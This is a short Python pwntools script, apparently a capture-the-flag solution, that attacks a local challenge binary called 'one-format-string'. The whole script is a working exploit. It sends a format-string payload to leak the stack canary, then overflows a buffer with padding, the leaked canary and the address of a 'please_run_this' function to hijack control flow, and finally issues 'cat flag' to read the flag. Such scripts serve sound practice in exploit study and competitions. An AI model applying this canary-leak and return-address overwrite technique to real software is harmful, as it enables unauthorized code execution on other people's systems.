from pwn import *

binary = ELF('./one-format-string')
comm = process(binary.path)

# get exploit func
func = binary.sym['please_run_this']

# get canary
comm.sendline(b'%23$lx %1000x %13$n')
comm.recvuntil(b'\n')
stack_canary = comm.recvuntil(b'00')

# send in payload
payload = b''.join([
                    cyclic(0x48),
                    p64(int(stack_canary,16)),
                    p64(func),
                    p64(func),
                    ])
comm.sendline(payload)

# print the flag
comm.sendline(b'cat flag')
s = comm.clean()
if s.find(b'candl') != -1:
  comm.sendline(b'cat flag')
  print(comm.recv())
